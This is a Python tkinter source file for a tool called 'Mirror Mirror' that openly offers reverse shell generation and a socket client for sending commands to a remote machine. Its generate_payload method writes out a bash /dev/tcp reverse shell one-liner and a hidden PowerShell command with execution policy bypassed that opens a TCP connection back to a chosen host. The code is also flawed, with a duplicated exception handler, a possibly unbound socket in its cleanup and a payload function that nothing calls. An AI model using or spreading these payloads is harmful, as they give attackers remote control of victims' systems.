# Mirror Mirror Application Enhancement with Database Integration and Core Functionality Restoration, Including Shell Type and Payload Generation

import socket
import logging
import tkinter as tk
from tkinter import scrolledtext
import sqlite3
import subprocess

# Configure Logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class MirrorMirrorApp:
    def __init__(self, master):
        self.master = master
        self.master.title("Mirror Mirror Application")
        
        # Setting up the User Interface
        self.connection_frame = tk.Frame(master)
        self.connection_frame.pack(pady=10)
        
        tk.Label(self.connection_frame, text="IP Address to Connect To:").grid(row=0, column=0)
        self.ip_address_entry = tk.Entry(self.connection_frame)
        self.ip_address_entry.grid(row=0, column=1)
        
        tk.Label(self.connection_frame, text="Port to Connect To:").grid(row=1, column=0)
        self.connect_to_port_entry = tk.Entry(self.connection_frame)
        self.connect_to_port_entry.grid(row=1, column=1)
        
        tk.Label(self.connection_frame, text="Send From Port:").grid(row=2, column=0)
        self.send_from_port_entry = tk.Entry(self.connection_frame)
        self.send_from_port_entry.grid(row=2, column=1)
        
        tk.Label(self.connection_frame, text="Listen On Port:").grid(row=3, column=0)
        self.listen_on_port_entry = tk.Entry(self.connection_frame)
        self.listen_on_port_entry.grid(row=3, column=1)
        
        self.connect_button = tk.Button(master, text="Generate Reverse Shell", command=self.connect_to_server)
        self.connect_button.pack(pady=5)
        
        self.shell_type_button = tk.Button(master, text="Shell Type", command=self.select_shell_type)
        self.shell_type_button.pack(pady=5)
        
        self.logs_text = scrolledtext.ScrolledText(master, width=80, height=20, wrap=tk.WORD)
        self.logs_text.pack(pady=10)
        
        self.next_best_actions_label = tk.Label(master, text="Next Best Actions:")
        self.next_best_actions_label.pack()
        self.next_best_actions_text = tk.Text(master, height=5, width=80, wrap=tk.WORD)
        self.next_best_actions_text.pack()

        # Set up database
        self.setup_database()
        self.populate_database()

        # Default Shell Type
        self.shell_type = "bash"

    def setup_database(self):
        # Create or connect to the SQLite database
        self.conn = sqlite3.connect('mirror_mirror.db')
        self.cursor = self.conn.cursor()
        
        # Create the next_best_actions table if it doesn't exist
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS next_best_actions (
                status TEXT PRIMARY KEY,
                action TEXT
            )
        ''')
        self.conn.commit()

    def populate_database(self):
        # Insert or update default actions
        actions = [
            ("success", "Successful connection. You can now send commands or interact with the server."),
            ("failure", "Failed to connect. Please check your ports, server availability, and network connection. Retry with different port settings or ensure the server is running."),
            ("unknown", "Unknown status. Check the logs for more information."),
            ("invalid_ip", "Invalid IP address format. Please ensure the IP address is correctly formatted."),
            ("timeout", "Connection attempt timed out. Please verify the target server is reachable and try again."),
            ("port_error", "Port numbers must be in the valid range (1-65535). Please adjust the ports and retry.")
        ]
        
        for status, action in actions:
            self.cursor.execute('''
                INSERT INTO next_best_actions (status, action) 
                VALUES (?, ?) 
                ON CONFLICT(status) DO UPDATE SET action=excluded.action
            ''', (status, action))
        self.conn.commit()

    def log_message(self, message, level=logging.INFO):
        logging.log(level, message)
        self.logs_text.insert(tk.END, message + '\n')
        self.logs_text.yview(tk.END)

    def suggest_next_best_actions(self, status):
        self.next_best_actions_text.delete(1.0, tk.END)
        
        # Retrieve the appropriate next best action from the database
        self.cursor.execute("SELECT action FROM next_best_actions WHERE status = ?", (status,))
        result = self.cursor.fetchone()
        if result:
            action = result[0]
        else:
            action = "No suggestion available for this status."
        
        self.next_best_actions_text.insert(tk.END, action)

    def connect_to_server(self):
        # Retrieve user-provided IP and ports
        ip_address = self.ip_address_entry.get()
        connect_to_port = self.connect_to_port_entry.get()
        send_from_port = self.send_from_port_entry.get()
        listen_on_port = self.listen_on_port_entry.get()
        
        try:
            # Validate IP address
            socket.inet_aton(ip_address)
            
            # Validate ports
            connect_to_port = int(connect_to_port)
            send_from_port = int(send_from_port)
            listen_on_port = int(listen_on_port)
            
            if not (1 <= connect_to_port <= 65535 and 1 <= send_from_port <= 65535 and 1 <= listen_on_port <= 65535):
                raise ValueError("Port numbers must be in the range 1-65535.")
            
            # Setting up the socket
            self.log_message(f"Attempting to create socket on ports: send from {send_from_port}, listen on {listen_on_port}.")
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.bind(("", send_from_port))
            client_socket.settimeout(5)  # Timeout for testing connections
            
            server_address = (ip_address, connect_to_port)
            self.log_message(f"Attempting to connect to server at {server_address}.")
            
            client_socket.connect(server_address)
            self.log_message("Connection established successfully.", logging.INFO)
            self.suggest_next_best_actions("success")
            
            # Launch an interactive shell
            self.interact_with_shell(client_socket)
            
        except socket.error as e:
            if "timed out" in str(e):
                self.log_message(f"Connection failed with error: {e}", logging.ERROR)
                self.suggest_next_best_actions("timeout")
            else:
                self.log_message(f"Connection failed with error: {e}", logging.ERROR)
                self.suggest_next_best_actions("failure")
        
        except ValueError as e:
            if "Port numbers must be" in str(e):
                self.log_message(str(e), logging.ERROR)
                self.suggest_next_best_actions("port_error")
            else:
                self.log_message("Error: Ports must be integers.", logging.ERROR)
                self.suggest_next_best_actions("failure")
        
        except socket.error:
            self.log_message("Error: Invalid IP address format.", logging.ERROR)
            self.suggest_next_best_actions("invalid_ip")
        
        finally:
            client_socket.close()

    def select_shell_type(self):
        # Function to select shell type (e.g., bash or powershell)
        self.shell_type = "powershell" if self.shell_type == "bash" else "bash"
        self.log_message(f"Shell type set to: {self.shell_type}")

    def interact_with_shell(self, client_socket):
        self.log_message("Interacting with shell...")
        try:
            while True:
                command = input(f"{self.shell_type}> ")
                if command.lower() in ["exit", "quit"]:
                    break
                client_socket.send(command.encode())
                response = client_socket.recv(4096).decode()
                print(response)
        except Exception as e:
            self.log_message(f"Error interacting with shell: {e}", logging.ERROR)

    def generate_payload(self):
        # Generate an actionable payload
        if self.shell_type == "bash":
            payload = f"bash -i >& /dev/tcp/{self.ip_address_entry.get()}/{self.connect_to_port_entry.get()} 0>&1"
        else:
            payload = f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('{self.ip_address_entry.get()}',{self.connect_to_port_entry.get()});"
        self.log_message(f"Generated Payload: {payload}")

if __name__ == "__main__":
    root = tk.Tk()
    app = MirrorMirrorApp(root)
    root.mainloop()
